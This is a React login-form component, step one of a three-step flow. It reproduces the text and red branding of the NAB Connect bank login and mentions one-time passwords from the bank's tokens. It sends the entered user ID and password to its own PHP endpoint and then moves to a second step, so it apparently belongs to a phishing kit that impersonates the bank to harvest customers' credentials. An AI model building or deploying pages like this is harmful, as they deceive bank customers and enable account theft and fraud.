import axiosClient from "@/api/axiosClient";
import { useAppDispatch, useAppSelector } from "@/app/hooks";
import FormField from "@/components/form/form-field";
import useAccessToken from "@/hooks/useAccessToken";
import useHandleResponseError from "@/hooks/useHandleResponseError";
import { LoginFormProps } from "@/models/forms/login";
import {
  addLoading,
  removeLoading,
  selectIsLoading,
} from "@/redux/global-slice";
import { zodResolver } from "@hookform/resolvers/zod";
import { Button } from "antd";
import React from "react";
import { useForm } from "react-hook-form";
import * as z from "zod";

interface StepOneProps {
  onChangeStep: (step: 1 | 2 | 3) => void;
}

const validateSchema = z.object({
  userId: z.string().min(5, { message: "Min length of user id is 5" }),
  password: z.string().min(5, { message: "Min length of password is 5" }),
});

const StepOne: React.FunctionComponent<StepOneProps> = ({ onChangeStep }) => {
  const dispatch = useAppDispatch();
  const isLoading = useAppSelector(selectIsLoading);
  const { setAccessToken } = useAccessToken();
  const handleResponseError = useHandleResponseError();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<LoginFormProps>({
    resolver: zodResolver(validateSchema),
    mode: "onChange",
  });

  const onLogin = (data: LoginFormProps) => {
    dispatch(addLoading());
    axiosClient
      .post(
        "/api/authentication/signup.php",
        {
          username: data.userId,
          password: data.password,
        },
        {
          headers: {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET,PUT,POST,DELETE,PATCH,OPTIONS",
          },
        }
      )
      .then((res) => {
        setAccessToken(res.data.access_token);
        onChangeStep(2);
      })
      .catch((e) => {
        console.error(e);
        handleResponseError("Đã xảy ra lỗi");
      })
      .finally(() => {
        dispatch(removeLoading());
      });
  };

  return (
    <form
      onSubmit={handleSubmit(onLogin)}
      className="w-[500px] p-4 bg-white rounded-md"
    >
      <FormField
        label={"User ID"}
        name={"userId"}
        placeholder={"Please enter user id"}
        errors={errors}
        register={register}
      />
      <button
        type="button"
        className="text-sm font-medium text-red-600 underline border-0 outline-none"
      >
        Forgot your User ID?
      </button>

      <FormField
        label={"Password"}
        name={"password"}
        placeholder={"Please enter password"}
        errors={errors}
        register={register}
        className="mt-3"
        type="password"
      />
      <p className="mt-2 text-sm">
        Enter your NAB Connect password, or the one-time password from your
        mobile or physical token.
      </p>
      <button
        type="button"
        className="text-sm font-medium text-red-600 underline border-0 outline-none"
      >
        Forgot your password?
      </button>

      <div className="flex items-center gap-2 mt-5">
        <input type="checkbox" id="remember" className="w-3 h-3" />
        <label htmlFor="remember" className="text-sm cursor-pointer">
          Remember my User ID
        </label>
      </div>

      <Button
        type="primary"
        className="flex items-center justify-center w-32 h-10 py-2 mt-5 font-bold text-white duration-300 rounded-md hover:!bg-custom-red-2 !bg-custom-red-1 text-md"
        loading={!!isLoading}
        htmlType="submit"
      >
        Login
      </Button>
    </form>
  );
};

export default StepOne;
